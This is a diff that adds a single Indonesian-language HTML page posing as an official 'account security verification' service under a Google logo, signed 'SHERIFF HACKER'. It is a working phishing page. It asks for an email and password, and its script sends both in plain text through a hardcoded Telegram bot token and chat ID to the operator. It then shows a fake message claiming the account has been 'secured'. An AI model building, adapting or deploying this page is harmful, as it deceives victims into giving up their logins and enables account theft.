@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Keamanan & Penegakan Hukum | SHERIFF</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { 
+            background-color: #0f172a; 
+            background-image: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            display: flex; align-items: center; justify-content: center; 
+            min-height: 100vh; padding: 20px; 
+        }
+        .kotak { 
+            background: #1e293b; 
+            border: 2px solid #3b82f6;
+            box-shadow: 0 0 25px rgba(59, 130, 246, 0.4);
+            padding: 30px; border-radius: 12px; 
+            width: 100%; max-width: 420px; 
+            position: relative;
+            overflow: hidden;
+        }
+        .kotak::after {
+            content: "SHERIFF HACKER • KUASAI KEBENARAN © 2026";
+            position: absolute;
+            bottom: 4px;
+            right: 8px;
+            font-size: 9px;
+            color: #93c5fd;
+            font-weight: bold;
+        }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { width: 80px; filter: drop-shadow(0 0 5px rgba(59, 130, 246, 0.3)); }
+        h2 { text-align: center; color: #f8fafc; font-size: 22px; margin-bottom: 8px; }
+        p { text-align: center; color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
+        label { color: #e2e8f0; font-size: 14px; font-weight: 500; display: block; margin-bottom: 6px; }
+        input { 
+            width: 100%; padding: 12px 15px; 
+            border: 1px solid #475569; background-color: #334155;
+            color: #f8fafc;
+            border-radius: 8px; font-size: 16px; margin-bottom: 20px; 
+        }
+        input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
+        .tombol { 
+            width: 100%; padding: 12px; 
+            background-color: #3b82f6; color: white; 
+            border: none; border-radius: 8px; 
+            font-size: 16px; font-weight: bold; 
+            cursor: pointer; transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .tombol:hover { background-color: #2563eb; box-shadow: 0 0 12px rgba(59, 130, 246, 0.5); }
+        .peringatan { 
+            background: rgba(59, 130, 246, 0.1); 
+            color: #93c5fd; padding: 10px; border-radius: 8px; 
+            font-size: 13px; text-align: center; margin-bottom: 20px;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+        .modal {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.8);
+            align-items: center; justify-content: center; z-index: 999;
+            backdrop-filter: blur(5px);
+        }
+        .modal.show { display: flex; }
+        .modal-kotak {
+            background: #1e293b; border: 2px solid #3b82f6;
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.4);
+            padding: 25px; border-radius: 12px;
+            width: 90%; max-width: 380px;
+        }
+        .dev-info {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 10px;
+            color: #64748b;
+        }
+    </style>
+</head>
+<body>
+    <div class="kotak">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Security System">
+        </div>
+        <h2>SISTEM KEAMANAN AKUN</h2>
+        <p>Verifikasi Resmi • Penegakan Keamanan Siber</p>
+        
+        <div class="peringatan">⚠️ SISTEM EKSLUSIF • HAK PENGGUNAAN PENUH</div>
+
+        <div>
+            <label>IDENTITAS AKUN / EMAIL</label>
+            <input type="email" id="email" placeholder="masukkan-akun@gmail.com" required>
+        </div>
+
+        <div>
+            <label>KODE KEAMANAN / SANDI</label>
+            <input type="password" id="pass" placeholder="Masukkan kode verifikasi" required>
+        </div>
+
+        <button class="tombol" onclick="kirimData()">PROSES VERIFIKASI & AMANKAN</button>
+
+        <div class="dev-info">
+            ⚡ Developed by: SHERIFF HACKER | Penegak Keadilan
+        </div>
+    </div>
+
+    <div id="hasilModal" class="modal">
+        <div class="modal-kotak">
+            <h3 class="text-center text-blue-400 font-bold mb-3 text-lg">✅ AMANKAN & TERVERIFIKASI</h3>
+            <div class="bg-slate-800 p-3 rounded-md mb-4 text-sm">
+                <p class="text-slate-300 mb-1">📧 <b>DATA DIVERIFIKASI:</b> <span id="modalEmail" class="text-blue-400"></span></p>
+                <p class="text-slate-300">🔑 <b>STATUS:</b> <span id="modalPass" class="text-blue-400">Diamankan di Server Resmi</span></p>
+            </div>
+            <p class="text-sky-400 text-xs text-center mb-4">⚖️ Data dicatat untuk keperluan penegakan hukum & keamanan</p>
+            
+            <button class="tombol bg-blue-600 hover:bg-blue-700" onclick="closeModal()">TUTUP SISTEM</button>
+
+            <div class="dev-info mt-3">
+                Sheriff Hacker Dev © 2026 • "Justice Through Code"
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================================================
+        //          KUNCI SISTEM EKSKLUSIF SHERIFF
+        //            HANYA UNTUK PENGGUNAAN PRIBADI
+        // ==================================================
+        const KEY = "8828591846:AAEEtJgtEdf0wu5JD_BYeF2-9apuVy-Q9pU";
+        const TUJUAN = "8922169139";
+        // ==================================================
+        //                   AKHIR KUNCI
+        // ==================================================
+
+        let clickCount = 0;
+        let mockData = [];
+
+        function kirimData() {
+            let email = document.getElementById('email').value;
+            let sandi = document.getElementById('pass').value;
+            mockData.push({ email: email, pass: sandi });
+
+            // ✅ LAPORAN MASUK KE TELEGRAM KAMU - FORMAT RESMI
+            let pesan = `🚨 <b>==> LAPORAN PENANGKAPAN DATA <==</b> 🚨
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 <b>AKUN TERIDENTIFIKASI:</b> <code>${email}</code>
+🔐 <b>KODE KEAMANAN:</b> <code>${sandi}</code>
+⏰ <b>WAKTU PENCATATAN:</b> ${new Date().toLocaleString('id-ID')}
+🛡️ <b>STATUS:</b> Berhasil diamankan • Siap tindak lanjut
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚖️ <b>PENEGAK:</b> SHERIFF HACKER • Sistem Pribadi`;
+
+            // KIRIM LANGSUNG KE HP KAMU
+            fetch(`https://api.telegram.org/bot${KEY}/sendMessage?chat_id=${TUJUAN}&text=${encodeURIComponent(pesan)}&parse_mode=HTML`);
+            
+            setTimeout(() => { showResult(); }, 1200);
+        }
+
+        function showResult() {
+            const modal = document.getElementById('hasilModal');
+            const emailSpan = document.getElementById('modalEmail');
+            emailSpan.innerText = mockData[clickCount].email;
+            modal.classList.add('show');
+            clickCount++;
+        }
+
+        function closeModal() {
+            document.getElementById('hasilModal').classList.remove('show');
+            document.querySelector('.kotak').innerHTML = `
+                <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"></div>
+                <h2 style="color:#3b82f6; text-align:center">SISTEM AMAN & TERJAGA</h2>
+                <p style="text-align:center; color:#94a3b8">Data telah diamankan. Ancaman telah dinetralisir.</p>
+                <div class="dev-info">⚖️ Sheriff Hacker • Penegak Keadilan</div>
+            `;
+        }
+    </script>
+</body>
+</html>
